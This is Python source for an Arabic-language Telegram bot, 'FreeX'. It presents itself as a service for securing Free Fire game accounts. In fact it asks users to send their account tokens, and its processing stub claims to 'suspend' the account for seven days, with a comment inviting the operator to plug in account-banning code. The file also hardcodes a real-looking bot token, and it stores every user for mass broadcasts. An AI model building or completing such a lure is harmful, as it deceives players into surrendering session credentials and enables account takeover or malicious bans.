#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import logging
import requests
import threading
from datetime import datetime

# =============== CONFIG ===============
BOT_TOKEN = "8987357781:AAEKkFtkTyOt7HYgEsNbP3zRUPBc1wb8quA"
ADMIN_IDS = [7444758567, 8357495756]  # ضع أيدي الأدمن هنا

USERS_FILE = "users.json"

# =============== COLORS ===============
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'

# =============== TELEGRAM API ===============
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# =============== LOGGING ===============
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

# =============== FILE HANDLING ===============
def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def add_user(user_id, username=None, first_name=None):
    users = load_users()
    if str(user_id) not in users:
        users[str(user_id)] = {
            "username": username or "Unknown",
            "first_name": first_name or "Unknown",
            "joined_at": datetime.now().isoformat()
        }
        save_users(users)
        return True
    return False

# =============== HELPERS ===============
def send_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
    url = f"{TELEGRAM_API}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.json()
    except Exception as e:
        logging.error(f"send_message error: {e}")
        return None

def edit_message(chat_id, message_id, text, reply_markup=None, parse_mode="HTML"):
    url = f"{TELEGRAM_API}/editMessageText"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        logging.error(f"edit_message error: {e}")

def delete_message(chat_id, message_id):
    url = f"{TELEGRAM_API}/deleteMessage"
    payload = {"chat_id": chat_id, "message_id": message_id}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        logging.error(f"delete_message error: {e}")

def send_and_delete(chat_id, text, delay=10, reply_markup=None, parse_mode="HTML"):
    result = send_message(chat_id, text, reply_markup, parse_mode)
    if result and result.get("ok"):
        message_id = result["result"]["message_id"]
        threading.Timer(delay, delete_message, args=[chat_id, message_id]).start()
    return result

def broadcast_message(text):
    users = load_users()
    count = 0
    for user_id in users.keys():
        try:
            send_message(int(user_id), text)
            count += 1
            time.sleep(0.05)
        except:
            pass
    return count

# =============== KEYBOARDS ===============
def start_keyboard():
    return {
        "inline_keyboard": [
            [
                {"text": "🔗 طريقة استخراج التوكن", "url": "https://t.me/+2bxcXrv-OXwyZDQ0"}
            ]
        ]
    }

def admin_panel_keyboard():
    return {
        "inline_keyboard": [
            [
                {"text": "👥 عرض المستخدمين", "callback_data": "admin_users"},
                {"text": "📢 نشر إعلان", "callback_data": "admin_broadcast"}
            ],
            [
                {"text": "🔙 رجوع", "callback_data": "admin_back"}
            ]
        ]
    }

def admin_back_keyboard():
    return {
        "inline_keyboard": [
            [
                {"text": "🔙 رجوع للوحة التحكم", "callback_data": "admin_panel"}
            ]
        ]
    }

# =============== MESSAGES ===============
WELCOME_MESSAGE = """
🔥 مرحباً بك في بوت FreeX!

هذا البوت يساعدك في تأمين حسابك في فري فاير.

⚡ المميزات:
• التحقق من توكن الحساب
• تعليق الحساب لمدة 7 أيام
• مساعدة في استعادة الحساب

👨‍💻 المطور: @lwv_v
🛡 الدعم: @falcon_store01
"""

TOKEN_REQUEST_MESSAGE = """
📩 أرسل توكن حسابك:

سأقوم بمعالجته وتعليق الحساب لمدة 7 أيام.

🔗 طريقة استخراج التوكن:
<a href="https://t.me/+2bxcXrv-OXwyZDQ0">اضغط هنا للشرح</a>

⚠️ ملاحظة: هذا الإجراء غير قابل للتراجع!
"""

TOKEN_RECEIVED_MESSAGE = """
✅ تم استلام التوكن بنجاح!
"""

PROCESSING_MESSAGE = """
⏳ جاري معالجة طلبك...
"""

BANNED_MESSAGE = """
📌 تم تعليق الحساب لمدة 7 أيام 😊
"""

ADMIN_PANEL_MESSAGE = """
🔐 لوحة تحكم الأدمن

مرحباً بك في لوحة الأدمن!

اختر أحد الإجراءات أدناه:
"""

# =============== TOKEN PROCESSING ===============
def process_token(chat_id, token):
    """معالجة التوكن وتعليق الحساب"""
    
    # 1. إرسال رسالة استلام التوكن
    send_message(chat_id, TOKEN_RECEIVED_MESSAGE)
    time.sleep(2)
    
    # 2. إرسال رسالة جاري المعالجة
    send_message(chat_id, PROCESSING_MESSAGE)
    time.sleep(3)
    
    # 3. هنا كود التحقق من التوكن وتعليق الحساب
    # يمكنك ربطه مع كود البانر حقك
    
    # مثال: التحقق من صحة التوكن
    is_valid = True  # غيّر هذا حسب منطق التحقق
    
    if is_valid:
        # 4. إرسال رسالة نجاح الحظر
        send_message(chat_id, BANNED_MESSAGE)
    else:
        send_message(chat_id, "❌ توكن غير صالح. الرجاء المحاولة مجدداً.")

# =============== BOT LOGIC ===============
user_state = {}

def handle_message(update):
    if "message" in update:
        msg = update["message"]
        chat_id = msg["chat"]["id"]
        text = msg.get("text", "")
        message_id = msg.get("message_id")
        username = msg.get("from", {}).get("username")
        first_name = msg.get("from", {}).get("first_name")

        add_user(chat_id, username, first_name)

        # /start command
        if text.startswith("/start"):
            send_message(chat_id, WELCOME_MESSAGE)
            time.sleep(10)
            send_message(chat_id, TOKEN_REQUEST_MESSAGE, reply_markup=start_keyboard())
            return

        # معالجة رسائل الأدمن
        if chat_id in ADMIN_IDS:
            if user_state.get(chat_id) == "waiting_broadcast":
                count = broadcast_message(text)
                send_message(chat_id, f"✅ تم إرسال الإعلان إلى <b>{count}</b> مستخدم.", parse_mode="HTML")
                user_state[chat_id] = None
                send_message(chat_id, ADMIN_PANEL_MESSAGE, reply_markup=admin_panel_keyboard())
                return

        # استقبال التوكن
        if not text.startswith("/"):
            process_token(chat_id, text)

    elif "callback_query" in update:
        callback = update["callback_query"]
        chat_id = callback["message"]["chat"]["id"]
        message_id = callback["message"]["message_id"]
        data = callback["data"]

        # ====== لوحة الأدمن ======
        if data == "admin_panel":
            if chat_id not in ADMIN_IDS:
                send_message(chat_id, "⛔ <b>أنت لست أدمن!</b>", parse_mode="HTML")
                return
            edit_message(chat_id, message_id, ADMIN_PANEL_MESSAGE, reply_markup=admin_panel_keyboard())

        elif data == "admin_users":
            if chat_id not in ADMIN_IDS:
                return
            users = load_users()
            count = len(users)
            if count == 0:
                text = "📭 <b>لا يوجد مستخدمون حتى الآن.</b>"
            else:
                text = f"👥 <b>عدد المستخدمين: {count}</b>\n\n"
                for uid, info in list(users.items())[:50]:
                    text += f"• <code>{uid}</code> - {info.get('first_name', 'Unknown')} (@{info.get('username', '')})\n"
                if count > 50:
                    text += f"\n<i>... و {count - 50} مستخدم آخر</i>"
            edit_message(chat_id, message_id, text, reply_markup=admin_back_keyboard())

        elif data == "admin_broadcast":
            if chat_id not in ADMIN_IDS:
                return
            user_state[chat_id] = "waiting_broadcast"
            edit_message(chat_id, message_id, 
                "📢 <b>أرسل رسالة الإعلان الآن:</b>\n\n<i>سيتم إرسالها لكل المستخدمين.</i>",
                reply_markup={"inline_keyboard": [[{"text": "🔙 إلغاء", "callback_data": "admin_panel"}]]}
            )

        elif data == "admin_back":
            if chat_id not in ADMIN_IDS:
                return
            edit_message(chat_id, message_id, ADMIN_PANEL_MESSAGE, reply_markup=admin_panel_keyboard())

# =============== POLLING ===============
def get_updates(offset=None):
    url = f"{TELEGRAM_API}/getUpdates"
    params = {"timeout": 30, "allowed_updates": ["message", "callback_query"]}
    if offset:
        params["offset"] = offset
    try:
        response = requests.get(url, params=params, timeout=35)
        return response.json().get("result", [])
    except Exception as e:
        logging.error(f"get_updates error: {e}")
        return []

# =============== MAIN ===============
def main():
    print(f"{GREEN}[✓] FreeX Telegram Bot Started!{RESET}")
    print(f"{BLUE}[*] Admin IDs: {ADMIN_IDS}{RESET}")
    print(f"{BLUE}[*] Waiting for messages...{RESET}\n")

    offset = None
    while True:
        try:
            updates = get_updates(offset)
            for update in updates:
                if "update_id" in update:
                    offset = update["update_id"] + 1
                try:
                    handle_message(update)
                except Exception as e:
                    logging.error(f"Error handling update: {e}")
        except Exception as e:
            logging.error(f"Main loop error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print(f"{RED}[!] Please set your BOT_TOKEN in the code!{RESET}")
        sys.exit(1)
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Bot stopped.{RESET}")
        sys.exit(0)